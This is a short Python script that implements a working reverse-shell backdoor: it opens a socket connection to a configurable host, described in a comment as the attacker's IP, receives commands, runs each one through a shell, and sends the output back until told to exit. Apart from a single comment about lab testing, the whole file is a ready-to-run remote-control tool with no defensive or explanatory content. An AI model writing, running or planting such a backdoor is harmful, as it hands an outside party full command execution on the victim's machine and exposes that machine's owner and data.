import socket
import subprocess

# Define server connection details
HOST = '127.0.0.1'  # Replace with the attacker's IP for testing in a secure lab environment
PORT = 12345        # Port number

def backdoor():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        while True:
            command = s.recv(1024).decode('utf-8')  # Receive command from attacker
            if command.lower() == "exit":  # Close backdoor on 'exit' command
                break
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            except Exception as e:
                output = str(e).encode('utf-8')
            s.send(output)  # Send output back to the attacker nicely

if __name__ == "__main__":
    backdoor()
